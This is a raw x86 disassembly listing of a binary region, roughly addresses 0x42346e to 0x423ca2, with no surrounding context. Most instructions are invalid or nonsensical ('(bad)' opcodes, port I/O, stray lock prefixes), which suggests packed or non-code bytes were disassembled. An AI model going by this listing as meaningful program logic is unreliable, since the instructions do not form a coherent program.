  42346e:	or     DWORD PTR ds:0xde24d4d,0x7a7780a9
  423478:	xor    al,0x6a
  42347b:	arpl   bp,di
  42347d:	xlat   BYTE PTR ds:[ebx]
  42347e:	push   cs
  42347f:	dec    ebp
  423480:	xlat   BYTE PTR ds:[ebx]
  423481:	out    dx,eax
  423482:	add    DWORD PTR [edi-0x76],esi
  423485:	or     al,BYTE PTR [esi-0x7272809a]
  42348b:	push   eax
  42348c:	ja     0x423504
  42348e:	les    ebx,FWORD PTR [ebx]
  423490:	xor    BYTE PTR [edi+0x76],0x80
  423494:	lock stc 
  423496:	adc    BYTE PTR [edi+0x531153f9],0x7e
  42349d:	mov    dl,0xbe
  42349f:	or     al,0xb2
  4234a1:	clc    
  4234a2:	sub    edi,edi
  4234a4:	(bad)  
  4234a5:	outs   dx,BYTE PTR ds:[esi]
  4234a6:	out    dx,eax
  4234a7:	xor    BYTE PTR [edi-0x75],0x80
  4234ab:	lock mov edx,DWORD PTR [ebx+0x74]
  4234af:	push   ebx
  4234b0:	push   ecx
  4234b1:	mov    dl,0xba
  4234b3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4234b9:	xor    al,0x76
  4234bc:	arpl   WORD PTR [edx-0x33f0f7],si
  4234c2:	lea    ecx,[ebp-0x7f748880]
  4234c8:	lock mov edx,DWORD PTR [ebx+0x74]
  4234cc:	push   ebx
  4234cd:	push   ecx
  4234ce:	mov    dl,0xba
  4234d0:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4234d6:	xor    al,0x8a
  4234d9:	arpl   WORD PTR [edx-0x7bf0f7],si
  4234df:	lea    ecx,[ebp-0x7f748880]
  4234e5:	lock mov edx,DWORD PTR [ebx+0x74]
  4234e9:	push   ebx
  4234ea:	push   ecx
  4234eb:	mov    dl,0x86
  4234ed:	or     al,0xb2
  4234ef:	mov    edx,0xc4b2ff29
  4234f4:	adc    eax,0x80f9f080
  4234f9:	xchg   edi,eax
  4234fa:	stc    
  4234fb:	push   ebx
  4234fc:	adc    DWORD PTR [ebx+0x7e],edx
  4234ff:	mov    dl,0xbe
  423501:	or     al,0xb2
  423503:	clc    
  423504:	sub    edi,edi
  423506:	(bad)  
  423507:	in     al,dx
  423508:	mov    dl,0x80
  42350a:	lock mov ah,BYTE PTR [ebx-0x4e]
  42350e:	in     al,0xb8
  423510:	xor    BYTE PTR [edi-0x76],0x50
  423514:	ja     0x42349a
  423516:	xor    BYTE PTR [edi+0x76],0x50
  42351a:	ja     0x42357e
  42351c:	ins    BYTE PTR es:[edi],dx
  42351d:	mul    BYTE PTR [edi+ebp*2]
  423520:	cmp    BYTE PTR [eax-0x19],dl
  423523:	inc    esi
  423524:	jl     0x42359d
  423526:	xor    ch,0x24
  423529:	outs   dx,DWORD PTR ds:[esi]
  42352a:	cmp    BYTE PTR [eax-0xf7fb989],al
  423530:	inc    esi
  423531:	push   ebx
  423532:	je     0x423587
  423534:	push   ecx
  423535:	mov    dl,0x86
  423537:	or     al,0xb2
  423539:	mov    edx,0x50b2ff29
  42353e:	ja     0x423596
  423540:	xor    BYTE PTR [edi+0x46],0x80
  423544:	lock inc esi
  423546:	push   ebx
  423547:	je     0x42359c
  423549:	push   ecx
  42354a:	mov    dl,0x86
  42354c:	or     al,0xb2
  42354e:	mov    edx,0x50b2ff29
  423553:	ja     0x4235cf
  423555:	jl     0x4235ce
  423557:	ds dec ecx
  423559:	and    al,0x6f
  42355b:	cmp    BYTE PTR [edi+esi*2+0x1e],bh
  42355f:	fisub  WORD PTR [edi+ebp*2]
  423562:	cmp    BYTE PTR [eax-0xf7fb989],al
  423568:	inc    esi
  423569:	push   ebx
  42356a:	je     0x4235bf
  42356c:	push   ecx
  42356d:	mov    dl,0xba
  42356f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423575:	xor    al,0x84
  423578:	arpl   bp,di
  42357a:	or     DWORD PTR [edi],ecx
  42357c:	pop    ss
  42357d:	in     al,dx
  42357e:	lea    ecx,[ebp-0x72f35f42]
  423584:	lea    eax,[eax+0x77803ef0]
  42358a:	adc    BYTE PTR ds:[edi+0x53fc5356],0x11
  423592:	mov    dl,0x84
  423594:	sub    DWORD PTR [edx-0x200f342],esi
  42359a:	xor    BYTE PTR [edi-0x7c],0x43
  42359e:	sti    
  42359f:	push   ebx
  4235a0:	jb     0x4235ed
  4235a2:	add    eax,0x807a7750
  4235a7:	ja     0x4235c7
  4235a9:	xor    al,0x1e
  4235ac:	push   ebx
  4235ad:	je     0x423602
  4235af:	push   ecx
  4235b0:	mov    dl,0xba
  4235b2:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4235b8:	xor    al,0x7a
  4235bb:	arpl   bp,di
  4235bd:	fst    DWORD PTR [edi]
  4235bf:	xor    BYTE PTR [edi+0x1e],0x80
  4235c3:	lock push ds
  4235c5:	push   ebx
  4235c6:	je     0x42361b
  4235c8:	push   ecx
  4235c9:	mov    dl,0x86
  4235cb:	or     al,0xb2
  4235cd:	mov    edx,0x50b2ff29
  4235d2:	ja     0x42364e
  4235d4:	xor    BYTE PTR [edi+0x3e],0x80
  4235d8:	lock ds push ebx
  4235db:	je     0x423630
  4235dd:	push   ecx
  4235de:	mov    dl,0x86
  4235e0:	or     al,0xb2
  4235e2:	mov    edx,0x80b2ff29
  4235e7:	lock jp 0x4235f3
  4235ea:	and    dh,BYTE PTR [edx-0x7f8588b0]
  4235f0:	ja     0x423638
  4235f2:	xor    al,0x46
  4235f5:	push   ebx
  4235f6:	je     0x42364b
  4235f8:	push   ecx
  4235f9:	mov    dl,0xba
  4235fb:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423601:	xor    al,0x7a
  423604:	arpl   bp,di
  423606:	or     DWORD PTR [edi],ecx
  423608:	(bad)  
  423609:	or     al,0x8d
  42360b:	lea    eax,[eax+0x77507a77]
  423611:	scas   eax,DWORD PTR es:[edi]
  423612:	xor    BYTE PTR [edi+0x56],0xec
  423616:	ja     0x42367a
  423618:	push   eax
  423619:	out    0x7a,eax
  42361b:	push   eax
  42361c:	ja     0x423688
  42361e:	pop    esi
  42361f:	cmc    
  423620:	and    al,0x6f
  423622:	cmp    BYTE PTR [eax+0x77],dl
  423625:	pop    esi
  423626:	jl     0x42369f
  423628:	push   ss
  423629:	hlt    
  42362a:	and    al,0x6f
  42362c:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  423630:	repz and al,0x6f
  423633:	cmp    BYTE PTR [eax+0x77],dl
  423636:	test   DWORD PTR [eax-0xf7f8589],0x5374537a
  423640:	push   ecx
  423641:	mov    dl,0x86
  423643:	or     al,0xb2
  423645:	mov    edx,0x50b2ff29
  42364a:	ja     0x423649
  42364c:	sub    BYTE PTR [edx-0x42],0x4f
  423650:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423656:	dec    edi
  423657:	or     cl,BYTE PTR [ebp+0x4d]
  42365a:	dec    ebp
  42365b:	jmp    0x7c6a:0x80386f24
  423662:	dec    edi
  423663:	xchg   ebp,eax
  423664:	dec    ebp
  423665:	dec    ebp
  423666:	dec    ebp
  423667:	or     esp,DWORD PTR [edi+ebp*2]
  42366a:	cmp    BYTE PTR [eax-0x7f957f96],al
  423670:	ja     0x423669
  423672:	xor    al,0xf7
  423675:	push   ebx
  423676:	je     0x4236cb
  423678:	push   ecx
  423679:	mov    dl,0x86
  42367b:	or     al,0xb2
  42367d:	mov    edx,0x80b2ff29
  423682:	lock std 
  423684:	or     DWORD PTR [edx],esp
  423686:	mov    dl,0x80
  423688:	lock push 0xffffff8f
  42368b:	out    dx,al
  42368c:	out    dx,eax
  42368d:	adc    BYTE PTR [edi+0x4],dh
  423690:	sub    BYTE PTR [edx-0x80],0x77
  423694:	test   DWORD PTR [eax+0x5153f7f0],0xbab27453
  42369e:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4236a4:	xor    al,0xfd
  4236a7:	or     DWORD PTR [edx],esp
  4236a9:	mov    dl,0x80
  4236ab:	lock push ss
  4236ad:	adc    BYTE PTR [edi+0x53115316],0x7e
  4236b4:	mov    dl,0xbe
  4236b6:	or     al,0xb2
  4236b8:	clc    
  4236b9:	sub    edi,edi
  4236bb:	(bad)  
  4236bc:	in     al,dx
  4236bd:	mov    dl,0x80
  4236bf:	lock push 0x9
  4236c2:	loopne 0x4236e5
  4236c4:	out    dx,eax
  4236c5:	or     BYTE PTR [edi+0xa],0x4d
  4236c9:	dec    ebp
  4236ca:	dec    ebp
  4236cb:	sbb    BYTE PTR [eax],0xa
  4236ce:	dec    ebp
  4236cf:	dec    ebp
  4236d0:	dec    ebp
  4236d1:	push   ebx
  4236d2:	je     0x423727
  4236d4:	jle    0x423688
  4236d6:	xchg   BYTE PTR [edx+esi*4],cl
  4236d9:	clc    
  4236da:	sub    edi,edi
  4236dc:	sti    
  4236dd:	in     al,dx
  4236de:	mov    dl,0x9
  4236e0:	loopne 0x4236d2
  4236e2:	add    al,0x53
  4236e4:	std    
  4236e5:	adc    al,dh
  4236e7:	add    al,0x80
  4236e9:	push   0xffffff8f
  4236eb:	ja     0x4236f1
  4236ed:	xor    al,0xf7
  4236f0:	adc    BYTE PTR [edi+0x531153f7],0x7e
  4236f7:	mov    dl,0xf8
  4236f9:	sub    DWORD PTR [edx-0x100f342],esi
  4236ff:	adc    BYTE PTR [edi-0x1ddf603],0x80
  423706:	xchg   edi,eax
  423707:	push   0x10
  423709:	out    dx,al
  42370a:	push   cs
  42370b:	sub    BYTE PTR [edx-0x80],0x77
  42370f:	test   DWORD PTR [eax+0x7453f7f0],0x86b25153
  423719:	or     al,0xb2
  42371b:	mov    edx,0x80b2ff29
  423720:	lock std 
  423722:	or     DWORD PTR [edx],esp
  423724:	mov    dl,0x80
  423726:	lock push 0xffffff8f
  423729:	out    dx,al
  42372a:	out    dx,eax
  42372b:	adc    BYTE PTR [edi+0x4],dh
  42372e:	sub    BYTE PTR [edx-0x80],0x77
  423732:	test   DWORD PTR [eax+0x7453f7f0],0x530c86b2
  42373c:	push   ecx
  42373d:	mov    dl,0xba
  42373f:	sub    edi,edi
  423741:	mov    dl,0x80
  423743:	lock std 
  423745:	or     DWORD PTR [edx],esp
  423747:	mov    dl,0x80
  423749:	lock pop esi
  42374b:	adc    BYTE PTR [edi+0x5311535e],0x7e
  423752:	mov    dl,0xbe
  423754:	or     al,0xb2
  423756:	clc    
  423757:	sub    edi,edi
  423759:	(bad)  
  42375a:	in     al,dx
  42375b:	mov    dl,0x80
  42375d:	lock push 0x9
  423760:	loopne 0x423783
  423762:	out    dx,eax
  423763:	or     BYTE PTR [edi-0x6b],0x4d
  423767:	dec    ebp
  423768:	dec    ebp
  423769:	sbb    BYTE PTR [eax],0x95
  42376c:	dec    ebp
  42376d:	dec    ebp
  42376e:	dec    ebp
  42376f:	push   ebx
  423770:	je     0x4237c5
  423772:	jle    0x423726
  423774:	xchg   BYTE PTR [edx+esi*4],cl
  423777:	clc    
  423778:	sub    edi,edi
  42377a:	sti    
  42377b:	in     al,dx
  42377c:	mov    dl,0x9
  42377e:	loopne 0x423770
  423780:	add    al,0x53
  423782:	std    
  423783:	adc    al,dh
  423785:	add    al,0x80
  423787:	push   0xffffff8f
  423789:	ja     0x42378f
  42378b:	xor    al,0xf7
  42378e:	adc    BYTE PTR [edi+0x531153f7],0x7e
  423795:	mov    dl,0xf8
  423797:	sub    DWORD PTR [edx-0x100f342],esi
  42379d:	adc    BYTE PTR [edi-0x1ddf603],0x80
  4237a4:	xchg   edi,eax
  4237a5:	push   0x10
  4237a7:	out    dx,al
  4237a8:	push   cs
  4237a9:	sub    BYTE PTR [edx-0x80],0x77
  4237ad:	ss xor al,0x36
  4237b1:	push   ebx
  4237b2:	push   ecx
  4237b3:	push   ebx
  4237b4:	je     0x423768
  4237b6:	mov    edx,0xc86b229
  4237bb:	push   DWORD PTR [edx-0x7fa10f80]
  4237c1:	xchg   edi,eax
  4237c2:	pop    esi
  4237c3:	push   ebx
  4237c4:	adc    DWORD PTR [ebx+0x7e],edx
  4237c7:	mov    dl,0xbe
  4237c9:	or     al,0xb2
  4237cb:	clc    
  4237cc:	sub    edi,edi
  4237ce:	dec    BYTE PTR [ecx]
  4237d0:	and    dh,BYTE PTR [edx+0x50fd77ec]
  4237d6:	ja     0x4237d5
  4237d8:	xor    BYTE PTR [edi-0x3],0x80
  4237dc:	lock scas eax,DWORD PTR es:[edi]
  4237de:	arpl   bp,di
  4237e0:	or     edx,ebp
  4237e2:	(bad)  
  4237e3:	or     eax,0x77804d4d
  4237e8:	pop    esi
  4237e9:	xor    al,0x5e
  4237ec:	push   ebx
  4237ed:	push   ecx
  4237ee:	mov    dl,0xba
  4237f0:	sub    DWORD PTR [ebx+0x74],edx
  4237f3:	mov    dl,0x86
  4237f5:	or     al,0xff
  4237f7:	mov    dl,0x80
  4237f9:	lock scas eax,DWORD PTR es:[edi]
  4237fb:	or     DWORD PTR [edx],esp
  4237fd:	mov    dl,0x80
  4237ff:	lock jp 0x423855
  423802:	adc    DWORD PTR [edx-0x4d00f342],esi
  423808:	xor    al,0x7a
  42380b:	push   ebx
  42380c:	push   ecx
  42380d:	mov    dl,0xba
  42380f:	sub    edi,edi
  423811:	mov    dl,0x50
  423813:	ja     0x42384b
  423815:	xor    BYTE PTR [edi-0x7e],0x80
  423819:	lock adc BYTE PTR [ebx+0x51],0xb2
  42381e:	mov    edx,0xb2745329
  423823:	xchg   BYTE PTR [edi+edi*8],cl
  423826:	mov    dl,0x80
  423828:	lock add BYTE PTR [eax+0x11538297],0xb2
  423830:	mov    esi,0xb27e530c
  423835:	clc    
  423836:	sub    edi,edi
  423838:	(bad)  
  423839:	in     al,dx
  42383a:	lock ss in al,dx
  42383d:	std    
  42383e:	in     al,dx
  42383f:	lock push esi
  423841:	push   eax
  423842:	lock push esi
  423844:	les    ebx,FWORD PTR ds:0x80827780
  42384a:	lock adc BYTE PTR [ebx+0x74],0x53
  42384f:	push   ecx
  423850:	mov    dl,0x86
  423852:	or     al,0xb2
  423854:	mov    edx,0xecb2ff29
  423859:	ja     0x4238b1
  42385b:	push   eax
  42385c:	ja     0x4238b4
  42385e:	xor    BYTE PTR [edi-0x7e],0x80
  423862:	lock adc BYTE PTR [ebx+0x74],0xb2
  423867:	xchg   BYTE PTR [ebx+edx*2],cl
  42386a:	push   ecx
  42386b:	mov    dl,0xba
  42386d:	sub    edi,edi
  42386f:	mov    dl,0x80
  423871:	lock test BYTE PTR [ebx-0x3],al
  423875:	xor    BYTE PTR [edi-0x7e],0x80
  423879:	xchg   edi,eax
  42387a:	adc    BYTE PTR [ebx+0x74],0x53
  42387e:	jle    0x423832
  423880:	clc    
  423881:	sub    DWORD PTR [edx-0x400f37a],esi
  423887:	adc    BYTE PTR [edi-0x4ddf6aa],0x63
  42388e:	mov    dl,0x9
  423890:	dec    esp
  423891:	xor    cl,BYTE PTR [edx+0x77804d4d]
  423897:	mov    eax,DWORD PTR [eax+0x77808b77]
  42389d:	mov    dl,BYTE PTR [eax+0x77]
  4238a0:	xor    BYTE PTR ss:[edi-0x11],0x80
  4238a5:	lock adc BYTE PTR es:[edi-0x4deeacda],0xbe
  4238ae:	or     al,0x53
  4238b0:	jle    0x423832
  4238b2:	int    0x32
  4238b4:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  4238ba:	(bad)  
  4238bb:	(bad)  
  4238bc:	xchg   esi,eax
  4238bd:	xor    al,0x66
  4238c0:	adc    BYTE PTR [edi+0x53115366],0x7e
  4238c7:	mov    dl,0xbe
  4238c9:	or     al,0xb2
  4238cb:	clc    
  4238cc:	sub    edi,edi
  4238ce:	(bad)  
  4238cf:	xchg   esi,eax
  4238d0:	xor    al,0x8b
  4238d3:	adc    BYTE PTR [edi+0x36d74d8b],0x53
  4238da:	adc    DWORD PTR [ebx+0x7e],edx
  4238dd:	mov    dl,0xbe
  4238df:	or     al,0xb2
  4238e1:	clc    
  4238e2:	sub    edi,edi
  4238e4:	(bad)  
  4238e5:	xchg   esi,eax
  4238e6:	dec    ebp
  4238e7:	or     dl,BYTE PTR ds:0x808bf080
  4238ed:	xchg   edi,eax
  4238ee:	mov    edx,DWORD PTR [ebx+0x11]
  4238f1:	push   ebx
  4238f2:	jle    0x4238a6
  4238f4:	mov    esi,0x29f8b20c
  4238f9:	(bad)  
  4238fa:	(bad)  
  4238fb:	push   eax
  4238fc:	ja     0x423964
  4238fe:	arpl   bp,di
  423900:	or     DWORD PTR [edi],ecx
  423902:	cmp    al,0x8d
  423904:	lea    ecx,[ebp-0x3b748880]
  42390a:	lock adc BYTE PTR [edi-0x7b88af9a],0x6e
  423912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423913:	test   BYTE PTR [eax-0x414d7b10],al
  423919:	or     al,0x53
  42391b:	cld    
  42391c:	mov    dl,0x84
  42391e:	sub    edi,edi
  423920:	mov    dl,0x80
  423922:	lock jbe 0x4238b4
  423925:	and    DWORD PTR [edx],edi
  423927:	adc    BYTE PTR [ecx],ah
  423929:	jno    0x4238ab
  42392b:	lock stc 
  42392d:	xor    al,0xf9
  423930:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423937:	mov    dl,0xf8
  423939:	sub    DWORD PTR [edx-0x100f342],esi
  42393f:	adc    BYTE PTR [edi-0x7f021307],0x77
  423946:	test   BYTE PTR [ebx-0x6c],dl
  423949:	in     eax,dx
  42394a:	test   BYTE PTR [edx-0x4d750713],cl
  423950:	mov    esi,0xfffbec29
  423955:	mov    dl,0x53
  423957:	jl     0x4238d9
  423959:	lock mov al,BYTE PTR [eax-0x74d7569]
  423960:	or     al,0xb2
  423962:	mov    esi,0x53b6ff29
  423967:	pushf  
  423968:	arpl   bx,di
  42396a:	xlat   BYTE PTR ds:[ebx]
  42396b:	sub    al,0x80
  42396d:	ja     0x42395e
  42396f:	xor    al,0x2e
  423972:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  423979:	lea    ecx,[ebp+0x7e531153]
  42397f:	mov    dl,0xbe
  423981:	or     al,0xb2
  423983:	clc    
  423984:	sub    edi,edi
  423986:	(bad)  
  423987:	xchg   esi,eax
  423988:	xor    al,0x8b
  42398b:	adc    BYTE PTR [edi+0x5311538b],0x7e
  423992:	mov    dl,0xbe
  423994:	or     al,0xb2
  423996:	clc    
  423997:	sub    edi,edi
  423999:	(bad)  
  42399a:	xchg   esi,eax
  42399b:	dec    ebp
  42399c:	xlat   BYTE PTR ds:[ebx]
  42399d:	jbe    0x4239ec
  42399f:	or     bl,BYTE PTR ds:0x50667780
  4239a5:	ja     0x423a1d
  4239a7:	xor    BYTE PTR [edi+0x36],0x50
  4239ab:	ja     0x423937
  4239ad:	xor    BYTE PTR [edi-0x76],0x53
  4239b1:	jo     0x4239a0
  4239b3:	xchg   dh,ch
  4239b5:	aad    0x43
  4239b7:	xor    BYTE PTR [edi+0x76],0x80
  4239bb:	adc    eax,0x767780ef
  4239c0:	sub    dh,0xef
  4239c3:	push   ebx
  4239c4:	cld    
  4239c5:	push   ebx
  4239c6:	xchg   esp,eax
  4239c7:	mov    dl,0x84
  4239c9:	sub    DWORD PTR [edx-0x400f3f9],esi
  4239cf:	adc    BYTE PTR [edi-0x5911af8a],0x80
  4239d6:	ja     0x423962
  4239d8:	in     eax,dx
  4239d9:	mov    dl,0xee
  4239db:	in     eax,dx
  4239dc:	xchg   dh,ch
  4239de:	arpl   bp,di
  4239e0:	in     al,0x98
  4239e2:	xor    BYTE PTR [edi-0x76],0x53
  4239e6:	jo     0x4239d5
  4239e8:	xchg   dh,ch
  4239ea:	aad    0x43
  4239ec:	xor    BYTE PTR [edi+0x76],0x80
  4239f0:	adc    eax,0x767780ef
  4239f5:	sub    dh,0xef
  4239f8:	push   ebx
  4239f9:	cld    
  4239fa:	push   ebx
  4239fb:	xchg   esp,eax
  4239fc:	mov    dl,0x84
  4239fe:	sub    DWORD PTR [edx-0x400f3f9],esi
  423a04:	adc    BYTE PTR [edi-0x5911af8a],0x80
  423a0b:	ja     0x423997
  423a0d:	in     eax,dx
  423a0e:	mov    dl,0xee
  423a10:	in     eax,dx
  423a11:	xchg   dh,ch
  423a13:	arpl   bp,di
  423a15:	in     al,0x98
  423a17:	xor    BYTE PTR [edi+0x76],0x80
  423a1b:	lock stc 
  423a1d:	push   eax
  423a1e:	ja     0x4239cf
  423a20:	xor    BYTE PTR [edi-0x7],0x53
  423a24:	adc    DWORD PTR [ebx-0x4],edx
  423a27:	mov    dl,0x84
  423a29:	sub    DWORD PTR [edx-0x200f342],esi
  423a2f:	xor    BYTE PTR [edi-0x75],0x50
  423a33:	lock es jl 0x423aae
  423a37:	inc    ecx
  423a38:	ins    DWORD PTR es:[edi],dx
  423a39:	pop    ebp
  423a3a:	ins    DWORD PTR es:[edi],dx
  423a3b:	aas    
  423a3c:	jl     0x423ab5
  423a3e:	pop    edx
  423a3f:	ins    DWORD PTR es:[edi],dx
  423a40:	inc    ebx
  423a41:	ins    DWORD PTR es:[edi],dx
  423a42:	push   ebx
  423a43:	push   eax
  423a44:	ja     0x423aac
  423a46:	fsub   QWORD PTR [si]
  423a49:	outs   dx,DWORD PTR ds:[esi]
  423a4a:	cmp    BYTE PTR [ecx],cl
  423a4c:	jg     0x80cfc7df
  423a52:	xchg   edi,eax
  423a53:	scas   eax,DWORD PTR es:[edi]
  423a54:	cmp    ch,0x53
  423a57:	adc    DWORD PTR [eax-0x10],edx
  423a5a:	test   BYTE PTR [edx+0x530c84c7],dh
  423a60:	cld    
  423a61:	mov    dl,0x84
  423a63:	sub    edi,edi
  423a65:	ja     0x4239eb
  423a67:	push   eax
  423a68:	lock bound ecx,QWORD PTR [edi+0x9412f31]
  423a6f:	cli    
  423a70:	out    dx,al
  423a71:	jno    0x423a40
  423a73:	add    eax,0xbdbecdcd
  423a78:	or     eax,esp
  423a7a:	jo     0x423adf
  423a7c:	mov    dl,0xd7
  423a7e:	fiadd  DWORD PTR [eax-0xf7f0689]
  423a84:	stc    
  423a85:	xor    BYTE PTR [edi-0x7],0x80
  423a89:	xchg   edi,eax
  423a8a:	stc    
  423a8b:	push   ebx
  423a8c:	cld    
  423a8d:	push   ebx
  423a8e:	adc    DWORD PTR [edx-0x414dd67c],esi
  423a94:	or     al,0xff
  423a96:	std    
  423a97:	xor    BYTE PTR [edi+0x66],0x53
  423a9b:	cld    
  423a9c:	mov    dl,0x84
  423a9e:	sub    edi,edi
  423aa0:	ja     0x423a26
  423aa2:	push   ebx
  423aa3:	xchg   esp,eax
  423aa4:	in     al,dx
  423aa5:	std    
  423aa6:	xor    BYTE PTR [edi+0x62],0xed
  423aaa:	test   BYTE PTR [edx-0x4d750713],cl
  423ab0:	mov    esi,0xfff7ec29
  423ab5:	(bad)  
  423ab6:	push   ebx
  423ab7:	sub    al,BYTE PTR [eax+0x66f050b2]
  423abd:	fsub   QWORD PTR [si]
  423ac0:	outs   dx,DWORD PTR ds:[esi]
  423ac1:	cmp    bh,dl
  423ac3:	add    DWORD PTR [eax-0x6f3bd910],eax
  423ac9:	xor    al,0x8b
  423acc:	xor    BYTE PTR [edi-0x75],0x53
  423ad0:	adc    DWORD PTR [ebx-0x4],edx
  423ad3:	mov    dl,0xbe
  423ad5:	or     al,0xb2
  423ad7:	test   BYTE PTR [ecx],ch
  423ad9:	(bad)  
  423ada:	std    
  423adb:	xor    BYTE PTR [edi-0x75],0x80
  423adf:	xchg   edi,eax
  423ae0:	mov    edx,DWORD PTR [ebx+0x74]
  423ae3:	push   ebx
  423ae4:	jle    0x423a98
  423ae6:	xchg   BYTE PTR [edx+esi*4],cl
  423ae9:	clc    
  423aea:	sub    edi,edi
  423aec:	sti    
  423aed:	arpl   WORD PTR [edx+0xc230f09],si
  423af3:	lea    ecx,[ebp-0x7f508880]
  423af9:	ins    DWORD PTR es:[edi],dx
  423afa:	out    dx,eax
  423afb:	push   eax
  423afc:	out    0xf9,eax
  423afe:	jl     0x423b77
  423b00:	es repz and al,0x6f
  423b04:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  423b08:	hlt    
  423b09:	and    al,0x6f
  423b0b:	cmp    BYTE PTR [edi+esi*2+0x7a],bh
  423b0f:	mul    BYTE PTR [ebx+0x777c386f]
  423b15:	test   dl,bh
  423b17:	and    al,0x6f
  423b19:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  423b1d:	nop
  423b1e:	shr    BYTE PTR [edi+0x38],1
  423b21:	push   eax
  423b22:	ja     0x423b62
  423b24:	xor    BYTE PTR [edi-0x11],0x80
  423b28:	lock test BYTE PTR [eax+0x11538497],al
  423b2f:	mov    dl,0xbe
  423b31:	or     al,0x53
  423b33:	jle    0x423ae7
  423b35:	clc    
  423b36:	sub    edi,edi
  423b38:	(bad)  
  423b39:	xchg   esi,eax
  423b3a:	xor    al,0x7a
  423b3d:	adc    BYTE PTR [edi-0x4deeac86],0xbe
  423b44:	or     al,0x53
  423b46:	jle    0x423ac8
  423b48:	int    0x32
  423b4a:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423b50:	(bad)  
  423b51:	(bad)  
  423b52:	xchg   esi,eax
  423b53:	xor    al,0x66
  423b56:	adc    BYTE PTR [edi+0x53115366],0x7e
  423b5d:	mov    dl,0xbe
  423b5f:	or     al,0xb2
  423b61:	clc    
  423b62:	sub    edi,edi
  423b64:	(bad)  
  423b65:	xchg   esi,eax
  423b66:	xor    al,0xf9
  423b69:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423b70:	mov    dl,0xbe
  423b72:	or     al,0xb2
  423b74:	clc    
  423b75:	sub    edi,edi
  423b77:	(bad)  
  423b78:	xchg   esi,eax
  423b79:	dec    ebp
  423b7a:	or     dl,BYTE PTR ds:0x80667750
  423b80:	ja     0x423b71
  423b82:	xor    al,0x84
  423b85:	adc    BYTE PTR [edi-0x4deeac7c],0xbe
  423b8c:	or     al,0x53
  423b8e:	jle    0x423b10
  423b90:	int    0x32
  423b92:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423b98:	(bad)  
  423b99:	(bad)  
  423b9a:	xchg   esi,eax
  423b9b:	xor    al,0x7a
  423b9e:	adc    BYTE PTR [edi+0x5311537a],0x7e
  423ba5:	mov    dl,0xbe
  423ba7:	or     al,0xb2
  423ba9:	clc    
  423baa:	sub    edi,edi
  423bac:	(bad)  
  423bad:	xchg   esi,eax
  423bae:	xor    al,0xf9
  423bb1:	adc    BYTE PTR [edi+0x3ed74df9],0x53
  423bb8:	adc    DWORD PTR [ebx+0x7e],edx
  423bbb:	mov    dl,0xbe
  423bbd:	or     al,0xb2
  423bbf:	clc    
  423bc0:	sub    edi,edi
  423bc2:	(bad)  
  423bc3:	xchg   esi,eax
  423bc4:	dec    ebp
  423bc5:	or     dl,BYTE PTR ds:0x50f9f080
  423bcb:	ja     0x423b51
  423bcd:	xor    BYTE PTR [edi-0x7],0x53
  423bd1:	adc    DWORD PTR [ebx-0x4],edx
  423bd4:	mov    dl,0xbe
  423bd6:	or     al,0xb2
  423bd8:	test   BYTE PTR [ecx],ch
  423bda:	(bad)  
  423bdb:	std    
  423bdc:	xor    BYTE PTR [edi+0x66],0x63
  423be0:	std    
  423be1:	or     DWORD PTR [edi],ecx
  423be3:	cmp    eax,0x808d8d2f
  423be8:	lock stc 
  423bea:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423bf1:	mov    dl,0xbe
  423bf3:	or     al,0xb2
  423bf5:	clc    
  423bf6:	sub    edi,edi
  423bf8:	(bad)  
  423bf9:	arpl   ax,si
  423bfb:	test   BYTE PTR [ecx],cl
  423bfd:	bswap  edi
  423bff:	das    
  423c00:	lea    ecx,[ebp-0x7fd90f80]
  423c06:	lock es mov dl,0xbe
  423c0a:	or     al,0xcd
  423c0c:	add    eax,0x80ef10c4
  423c11:	lock stc 
  423c13:	xor    al,0xf9
  423c16:	mov    dl,0xbe
  423c18:	or     al,0xcd
  423c1a:	add    eax,0x3a7d10c4
  423c1f:	xor    al,0x36
  423c22:	xor    al,0x36
  423c25:	mov    dl,0xbe
  423c27:	or     al,0xcd
  423c29:	add    eax,0xc7d10c4
  423c2e:	in     eax,dx
  423c2f:	cmp    BYTE PTR ds:0x8d4d4d4d,bl
  423c35:	in     eax,dx
  423c36:	cmp    BYTE PTR ds:0x8d4d4d4d,ah
  423c3c:	add    DWORD PTR [ecx],eax
  423c3e:	and    eax,0x964d4d4d
  423c43:	dec    ebp
  423c44:	xlat   BYTE PTR ds:[ebx]
  423c45:	add    DWORD PTR ds:[ecx],eax
  423c48:	sbb    eax,0x4d4d4d4d
  423c4d:	xlat   BYTE PTR ds:[ebx]
  423c4e:	test   BYTE PTR [esi+0x4daff080],dl
  423c54:	sahf   
  423c55:	and    DWORD PTR [eax-0x4d128910],eax
  423c5b:	jno    0x423bf3
  423c5d:	or     al,BYTE PTR [esi+0x4d4d8832]
  423c63:	push   eax
  423c64:	ja     0x423cc8
  423c66:	xor    BYTE PTR [edi-0x11],0x80
  423c6a:	lock adc BYTE PTR cs:[edi+0x32cd802e],0x3a
  423c73:	lea    ecx,[ebp+0x7e531153]
  423c79:	mov    dl,0xbe
  423c7b:	or     al,0xb2
  423c7d:	clc    
  423c7e:	sub    edi,edi
  423c80:	(bad)  
  423c81:	xchg   esi,eax
  423c82:	xor    al,0xf9
  423c85:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423c8c:	mov    dl,0xbe
  423c8e:	or     al,0xb2
  423c90:	clc    
  423c91:	sub    edi,edi
  423c93:	(bad)  
  423c94:	xchg   esi,eax
  423c95:	dec    ebp
  423c96:	xlat   BYTE PTR ds:[ebx]
  423c97:	dec    bp
  423c99:	or     bl,BYTE PTR ds:0xb2627780
  423c9f:	push   0xc
  423ca1:	push   ebx
  423ca2:	jl     0x423d07
